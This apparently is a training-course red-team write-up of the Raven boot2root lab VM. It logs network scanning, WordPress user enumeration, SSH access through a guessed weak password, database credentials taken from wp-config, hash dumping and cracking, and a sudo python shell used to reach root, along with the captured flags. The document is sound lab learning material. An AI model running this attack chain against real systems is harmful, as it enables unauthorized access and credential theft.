# Red Team: Summary of Operations

### Exposed Services and Exploitation

Nmap scan results for each machine reveal the below services and OS details:

First I performed a port scan using `nmap` to enumerate the entire network:

> nmap -Pn 192.168.1.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-28 15:15 PST
Nmap scan report for 192.168.1.1
Host is up (0.00056s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2179/tcp open  vmrdp
3389/tcp open  ms-wbt-server
MAC Address: 00:15:5D:00:04:0D (Microsoft)

> Nmap scan report for 192.168.1.100
Host is up (0.00085s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
9200/tcp open  wap-wsp
MAC Address: 4C:EB:42:D2:D5:D7 (Intel Corporate)

> Nmap scan report for 192.168.1.105
Host is up (0.00089s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:15:5D:00:04:0F (Microsoft)

> Nmap scan report for 192.168.1.110
Host is up (0.0011s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:15:5D:00:04:10 (Microsoft)

> Nmap scan report for 192.168.1.115
Host is up (0.00069s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:15:5D:00:04:11 (Microsoft)

> Nmap scan report for 192.168.1.90
Host is up (0.000010s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

> Nmap done: 256 IP addresses (6 hosts up) scanned in 6.74 seconds

Then I delved more fully into two machines in particular to gather exposed services:

> nmap -sV 192.168.1.110
Nmap scan report for 192.168.1.110
Host is up (0.00053s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.10 ((Debian))
111/tcp open  rpcbind     2-4 (RPC #100000)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 00:15:5D:00:04:10 (Microsoft)
Service Info: Host: TARGET1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

> nmap -sV 192.168.1.115
Nmap scan report for 192.168.1.115
Host is up (0.00057s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.10 ((Debian))
111/tcp open  rpcbind     2-4 (RPC #100000)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 00:15:5D:00:04:11 (Microsoft)
Service Info: Host: TARGET2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

The following vulnerabilities were identified on each target:
* Target 1
  - User enumeration

    The team was able to use a Wordpress scan to enumerate the users using the command:

    `wpscan --url http://192.168.1.110 --enumerate u`

    Results of the scan identified two users:

    >3 4m[i][0m User(s) Identified:

    > [32m[+][0m steven
     | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
     | Confirmed By: Login Error Messages (Aggressive Detection)

    > [32m[+][0m michael
     | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
     | Confirmed By: Login Error Messages (Aggressive Detection)

  - Weak password

    Attackers were then easily able to `ssh` into the target by guessing the weak password of user `michael`, which was "michael".

    > ssh michael@192.168.1.110    
    > michael@192.168.1.110's password:

    > michael@target1:~$ ls

    Attackers were then able to use `grep` to find "flag1" inside of /var/www/html/service.html:

    > cat /var/www/html/service.html:			<!-- flag1{b9bbcb33e11b80be759c4e844862482d} -->

    Found flag2 the same way.  Traversed the file system and found inside the /var/www directory.

    > michael@target1:~$ cat /var/www/flag2.txt
    > flag2{fc3fd58dcdad9ab23faca6e9a36e581c}

  - Insecure password

    As the attackers were further searching the system, found credentials for the Wordpress database inside of /var/www/html/wp_config.php:

    > /** The name of the database for WordPress */
    define('DB_NAME', 'wordpress');

    > /** MySQL database username */
    define('DB_USER', 'root');

    > /** MySQL database password */
    define('DB_PASSWORD', 'R@v3nSecurity');

    Used those credentials to get into the Wordpress database and find flag3:

    > ichael@target1:~$ mysql -u root -p wordpress
      Enter password:
      Reading table information for completion of table and column names
      You can turn off this feature to get a quicker startup with -A

    >  Welcome to the MySQL monitor.  Commands end with ; or \g.
      Your MySQL connection id is 42
      Server version: 5.5.60-0+deb8u1 (Debian)

      Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.



> mysql> use wordpress;
Database changed
mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

select * from wp_posts;

| 2018-08-13 01:48:31 | 0000-00-00 00:00:00 | flag3{afc01ab56b50591e7dccf93122770cd2}

And was able to find additional users hashes in wp_users.

mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name   |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 | michael       | michael@raven.org |          | 2018-08-12 22:49:12 |                     |           0 | michael        |
|  2 | steven     | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ | steven        | steven@raven.org  |          | 2018-08-12 23:31:16 |                     |           0 | Steven Seagull |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+

  - Privilege escalation

Was able to use 'john' to crack the password for Steven (pink84), and then use that to escalate privileges and fine flag4:

michael@target1:~$ su - steven
Password:
$ sudo python -c 'import pty;pty.spawn("/bin/bash")'        
root@target1:/home/steven# cd /root
root@target1:~# ls
flag4.txt
root@target1:~# cat flag4.txt
______                      

| ___ \                    

| |_/ /__ ___   _____ _ __  

|    // _` \ \ / / _ \ '_ \

| |\ \ (_| |\ V /  __/ | | |

\_| \_\__,_| \_/ \___|_| |_|


flag4{715dea6c055b9fe3337544932f2941ce}

CONGRATULATIONS on successfully rooting Raven!

This is my first Boot2Root VM - I hope you enjoyed it.

Hit me up on Twitter and let me know what you thought:

@mccannwj / wjmccann.github.io
